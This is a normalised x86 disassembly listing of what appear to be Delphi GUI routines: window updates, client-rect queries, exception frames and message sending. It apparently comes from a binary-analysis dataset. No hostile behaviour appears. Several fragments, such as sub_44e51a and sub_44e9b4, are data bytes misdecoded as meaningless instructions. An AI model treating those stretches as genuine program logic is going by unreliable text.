jmp sub_4036d4
sub_446bb9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447174
jmp sub_403988
sub_44717b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447184
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_447682
jmp sub_403988
sub_4476d4
push ebx
mov ebx eax
call sub_4230f8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_443d6c
pop ebx
retn
sub_4476f0
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_443d6c
retn
sub_447704
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_443d6c
retn
sub_447714
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_443d6c
retn
sub_4479c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4496e8
pop esi
retn
sub_447ad4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_447b24
pop esi
retn
sub_447ae8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_447c10
pop esi
retn
sub_447afc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_447b10
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_447c03
jmp sub_403988
sub_447c0a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447c9a
jmp sub_403988
sub_447ca1
pop ebx
pop ecx
pop ebp
retn
sub_447ca8
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_447cb8
retn
sub_447cbc
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_447cdc
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_447e3c
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_447f0c
retn
sub_448024
jmp sub_403988
sub_44802b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4480f6
jmp sub_403988
sub_448120
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_4481b2
jmp sub_403988
sub_448384
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_448628
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_448704
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_446130
pop esi
retn
sub_4487c8
push esi
mov si 0xffc1
call sub_403430
pop esi
retn
sub_4487f4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_448808
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44881c
call sub_4460f0
retn
sub_448824
call sub_4460f0
retn
sub_44882c
call sub_4460f0
retn
sub_4488d4
push ebx
mov ebx eax
mov eax ebx
call sub_444788
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_424270
mov dx 0xb009
mov eax ebx
call sub_446130
pop ebx
retn
sub_448a38
call sub_4460f0
retn
sub_448a40
call sub_4460f0
retn
sub_448a48
call sub_4460f0
retn
sub_448a50
call sub_4460f0
retn
sub_448ab4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_448f4a
jmp sub_403988
sub_448f51
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449030
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_4491d4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_4493d8
retn
sub_4491ec
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_4493d8
mov edx eax
sub_44920c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_443d6c
retn
sub_4492ac
push ebx
mov ebx eax
mov eax ebx
call sub_4496dc
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4492c8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_4494a0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4493d8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4494f8
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443d6c
sub_449518
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_443d6c
sub_44953c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_449548
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_443d6c
sub_4495f4
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_449598
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4496d0
jmp sub_403988
sub_4496d7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4498f6
jmp sub_403988
sub_4498fd
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_449a04
call sub_443b3c
retn
sub_449e52
jmp sub_403988
sub_449ee8
mov eax [ r-xdata ]
retn
sub_44a04f
jmp sub_403988
sub_44a160
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443d6c
sub_44a476
jmp sub_403988
sub_44a5b8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_44a714
jmp sub_403988
sub_44a71b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4248b0
retn
sub_44a737
jmp sub_403988
sub_44a744
retn
sub_44a818
mov [ edx + 0xc ] 0xffffffff
retn
sub_44a876
jmp sub_403988
sub_44a87d
pop ecx
pop ecx
pop ebp
retn
sub_44a91d
jmp sub_403988
sub_44a924
pop ebx
mov esp ebp
pop ebp
retn
sub_44a990
call sub_4468f8
retn
sub_44aa23
jmp sub_403988
sub_44aa2a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_44ac09
jmp sub_403988
sub_44ac10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ae2c
jmp sub_403988
sub_44ae80
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_44ad6c
sub_44afc4
push ebx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_44afdc
push ebx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44b0c8
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_447530
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44b163
jmp sub_403988
sub_44b16a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b18d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4248b0
retn
sub_44b186
jmp sub_403988
sub_44b18d
pop ebx
pop ecx
pop ebp
retn
sub_44b194
retn
sub_44b1fc
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44b569
jmp sub_403988
sub_44b750
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44b93c
jmp sub_403988
sub_44b9ec
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_44ba00
inc [ eax + 0x6c ]
retn
sub_44ba04
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44d284
sub_44bb64
call sub_44c264
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_44c50f
jmp sub_403988
sub_44c516
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c533
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_44c52c
jmp sub_403988
sub_44c533
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c814
jmp sub_403988
sub_44c81b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c838
mov eax [ ebp - 0x4 ]
call sub_4248b0
retn
sub_44c831
jmp sub_403988
sub_44c838
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c855
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_44c84e
jmp sub_403988
sub_44c855
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cd09
jmp sub_403988
sub_44cd10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ce9b
jmp sub_403988
sub_44cea2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44cf57
jmp sub_403988
sub_44cf5e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44d04c
jmp sub_403988
sub_44d09d
jmp sub_403988
sub_44d0a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d160
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ba70
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44d2ac
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_44b5ac
sub_44dbac
jmp sub_403988
sub_44dbb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dc7c
call GetCapture
retn
sub_44dc84
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d064
pop ebx
retn
sub_44dc94
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44defa
jmp sub_403988
sub_44e0f4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44e308
jmp sub_403988
sub_44e30f
pop ebx
mov esp ebp
pop ebp
retn
sub_44e35a
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44e3d7
jmp sub_403988
sub_44e3de
pop ebp
retn
sub_44e466
jmp sub_403988
sub_44e46d
pop ebp
retn
sub_44e4bb
add [ eax - 0x55 ] cl
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add ah dl
adc [ edx ] al
clc
jmp r-xdata
add al bh
sub_44e51a
out dx eax
push edx
push ecx
dec eax
in al dx
inc esp
add ah dh
in al dx
inc esp
add al bl
jmp r-xdata
int3
j_sub_44e573
add al ch
jmp sub_44e573
sub_44e573
pop eax
add [ eax ] al
push [ esp + ebp * 8 + 0x44 ]
add ah dl
jmp sub_44e5c2
sub_44e6b4
stc
push ebx
push eax
jmp [ eax - 0x12 ]
sub_44e9b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
0xea940044 0x44
sub_44ebbc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41a4c4
retn
sub_44ebd4
mov al 0x1
retn
sub_44ebd8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_420b44
retn
mov eax edx
retn
sub_44ebe8
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_420b14
retn
mov al 0x1
retn
sub_44eed8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a468
pop esi
pop ebx
retn
sub_44eeec
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44ef28
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44f18c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f1a0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f1b4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f1c8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f1dc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f1f0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f204
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f218
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f22c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f240
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44f254
retn
sub_44f258
retn
sub_44f25c
retn
sub_44f260
retn
sub_44f264
retn
sub_44f268
retn
sub_44f26c
retn
sub_44f270
retn
sub_44f274
retn
sub_44f278
retn
sub_44f27c
retn
sub_44f280
retn
sub_44f52c
jmp sub_403988
sub_44f8c8
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x90 ] eax
sub_44f8f0
push esi
mov si 0xffef
call sub_403430
pop esi
retn
sub_44f991
jmp sub_403988
sub_44f998
pop ebp
retn
sub_44f99c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
sub_44fb3c
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44fcc1
jmp sub_403988
sub_44fcc8
pop ebx
pop ecx
pop ebp
retn
sub_44fccc
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44fcd4
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44fea4
sub_44fd81
jmp sub_403988
sub_44fd88
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403234
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44ff37
jmp sub_403988
sub_44ff3e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ffd6
jmp sub_403988
sub_44ffdd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fffa
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_44fff3
jmp sub_403988
sub_44fffa
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403430
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4500b3
jmp sub_403988
sub_4500ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4500c0
or edx 0xffffffff
call sub_450034
retn
sub_4504cf
jmp sub_403988
sub_4504d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504f3
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_4504ec
jmp sub_403988
sub_4504f3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450510
mov eax [ ebp - 0x4 ]
call sub_451008
retn
sub_450509
jmp sub_403988
sub_450510
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450714
jmp sub_403988
sub_45071b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450720
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403430
sub_450738
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_41900c
pop ebx
retn
sub_4507dc
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41a30c
sub_4508f3
jmp sub_403988
sub_4508fa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_450910
jmp sub_403988
sub_450c22
jmp sub_403988
sub_450c29
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c46
mov eax [ ebp - 0x10 ]
call sub_403234
retn
sub_450c3f
jmp sub_403988
sub_450c46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c63
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_450c5c
jmp sub_403988
sub_450c63
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450ccc
jmp sub_403988
sub_450de5
jmp sub_403988
sub_450e02
jmp sub_403988
sub_450fba
jmp sub_403988
sub_450fc1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451004
inc [ eax + 0x5c ]
retn
sub_451008
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403430
sub_45105c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_451099
jmp sub_403988
sub_4510a0
pop ebp
retn
sub_4510a4
sub [ rw-data ] 0x1
retn
sub_4514d7
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
int3
sub_45200c
mov eax [ esp + 0x8 ]
retn
sub_452014
push ebx
mov ebx eax
call sub_45200c
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
jmp sub_4039c0
sub_452030
pop ebx
retn
sub_4522a9
jmp sub_403988
sub_4522b0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4523fb
jmp sub_403988
sub_452402
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452418
push ebx
mov eax [ rw-data ]
call sub_41a9c0
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41a994
mov eax ebx
pop ebx
retn
sub_4525a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4525bc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_452cb7
jmp sub_403988
sub_452cbe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452db6
jmp sub_403988
sub_452dbd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4531e0
jmp sub_403988
sub_4531e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_453693
jmp sub_403988
sub_453b34
jmp sub_403988
sub_453b3b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453f9f
jmp sub_403988
sub_45445c
jmp sub_403988
sub_454463
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45480e
jmp sub_403988
sub_454815
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_454823
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4549d0
mov eax [ r-xdata ]
retn
sub_454a0c
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_454a20
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_454a30
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_454a40
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_454d3c
mov edx eax
sub_454ad8
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
mov edx esi
call sub_454a58
pop esi
pop ebx
retn
sub_454b54
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_454d3c
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41a4c4
mov ecx eax
sub_454f2c
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_454f94
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45533c
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_455370
sub_455370
mov edx sub_455348
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_452498
retn
sub_45555a
jmp sub_403988
sub_455561
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4559f8
jmp sub_403988
sub_455a37
jmp sub_403988
sub_455a3e
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455bdc
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_455d18
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403430
pop esi
pop ebp
retn 0x8
sub_455d34
mov eax [ eax + 0x34 ]
call sub_452f6c
retn
sub_455d40
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403430
pop esi
retn
sub_455d7c
push ebx
mov ecx sub_455d54
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_452498
pop ebx
retn
sub_455fb0
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_455fc4
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_4560f9
jmp sub_4036d4
sub_4561fb
jmp sub_403988
sub_456226
jmp sub_403988
sub_45622d
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_456244
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45642c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_455d7c
sub_4564ac
jmp sub_403988
sub_4564f0
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_456508
push ebx
mov ebx eax
mov eax ebx
call sub_420b64
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45655a
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_455d7c
sub_4565d0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_456719
jmp sub_403988
sub_456720
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_456960
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_456970
sub_4569c4
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4569d4
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_4569e4
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4569f4
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_456a04
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_456a7c
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_452dc4
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_452dc4
retn
sub_456a98
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_452dc4
sub_456ae0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_455d34
retn
mov eax edx
retn
sub_456b8c
mov [ eax + 0x58 ] edx
call sub_456ab4
retn
sub_456bc2
jmp sub_4036d4
sub_456bc7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456f2d
jmp sub_403988
sub_456f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403234
retn
sub_456f4a
